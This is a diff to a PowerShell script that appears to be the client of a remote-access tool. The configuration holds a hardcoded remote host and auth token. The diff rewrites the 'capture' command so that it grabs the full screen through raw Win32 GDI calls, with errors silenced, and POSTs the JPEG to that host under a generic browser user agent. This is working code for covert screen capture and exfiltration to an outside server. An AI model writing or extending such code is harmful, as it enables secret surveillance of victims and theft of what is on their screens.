@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.2.0"
+$Version = "3.2.1"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -1219,28 +1219,61 @@ function Connect-Cloudflare {
 
                 if ($command -eq "capture") {
                     try {
-                        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-                        $s   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                        $bmp = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
-                        $g   = [System.Drawing.Graphics]::FromImage($bmp)
-                        $g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
-                        $g.Dispose()
-                        $ms  = New-Object System.IO.MemoryStream
-                        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
-                        $encParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
-                        $encParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 85L)
-                        $bmp.Save($ms, $jpegCodec, $encParams)
-                        $bmp.Dispose()
-                        $jpegBytes = $ms.ToArray()
-                        $ms.Dispose()
+                        Add-Type -AssemblyName System.Drawing
+                        Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+using System.Drawing;
+using System.Drawing.Imaging;
+public class ScreenCapGdi {
+    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
+    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
+    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+    [DllImport("gdi32.dll")]  public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
+    [DllImport("gdi32.dll")]  public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int w, int h);
+    [DllImport("gdi32.dll")]  public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObj);
+    [DllImport("gdi32.dll")]  public static extern bool   BitBlt(IntPtr dst, int dx, int dy, int w, int h, IntPtr src, int sx, int sy, int rop);
+    [DllImport("gdi32.dll")]  public static extern bool   DeleteObject(IntPtr hObj);
+    [DllImport("gdi32.dll")]  public static extern bool   DeleteDC(IntPtr hDC);
+    [DllImport("gdi32.dll")]  public static extern int    GetDeviceCaps(IntPtr hDC, int idx);
+    public static byte[] Capture() {
+        IntPtr desktop = GetDesktopWindow();
+        IntPtr dcSrc   = GetWindowDC(desktop);
+        int w = GetDeviceCaps(dcSrc, 8);   // HORZRES
+        int h = GetDeviceCaps(dcSrc, 10);  // VERTRES
+        IntPtr dcDst   = CreateCompatibleDC(dcSrc);
+        IntPtr hBmp    = CreateCompatibleBitmap(dcSrc, w, h);
+        IntPtr hOld    = SelectObject(dcDst, hBmp);
+        BitBlt(dcDst, 0, 0, w, h, dcSrc, 0, 0, 0x00CC0020); // SRCCOPY
+        SelectObject(dcDst, hOld);
+        Bitmap bmp = Bitmap.FromHbitmap(hBmp);
+        DeleteDC(dcDst);
+        ReleaseDC(desktop, dcSrc);
+        DeleteObject(hBmp);
+        var ms = new System.IO.MemoryStream();
+        var codec = GetJpegCodec();
+        var ep = new EncoderParameters(1);
+        ep.Param[0] = new EncoderParameter(Encoder.Quality, 85L);
+        bmp.Save(ms, codec, ep);
+        bmp.Dispose();
+        return ms.ToArray();
+    }
+    static ImageCodecInfo GetJpegCodec() {
+        foreach (var c in ImageCodecInfo.GetImageEncoders())
+            if (c.MimeType == "image/jpeg") return c;
+        return null;
+    }
+}
+'@ -ErrorAction SilentlyContinue
+                        $jpegBytes  = [ScreenCapGdi]::Capture()
                         $captureUrl = "$cfHost/capture_frame?id=$clientId"
                         $req = [System.Net.HttpWebRequest]::Create($captureUrl)
-                        $req.Method          = 'POST'
-                        $req.ContentType     = 'image/jpeg'
-                        $req.ContentLength   = $jpegBytes.Length
-                        $req.Timeout         = 15000
+                        $req.Method           = 'POST'
+                        $req.ContentType      = 'image/jpeg'
+                        $req.ContentLength    = $jpegBytes.Length
+                        $req.Timeout          = 15000
                         $req.ReadWriteTimeout = 15000
-                        $req.UserAgent       = 'Mozilla/5.0'
+                        $req.UserAgent        = 'Mozilla/5.0'
                         $req.Headers.Add('X-Token', $cfToken)
                         $rs2 = $req.GetRequestStream()
                         $rs2.Write($jpegBytes, 0, $jpegBytes.Length)
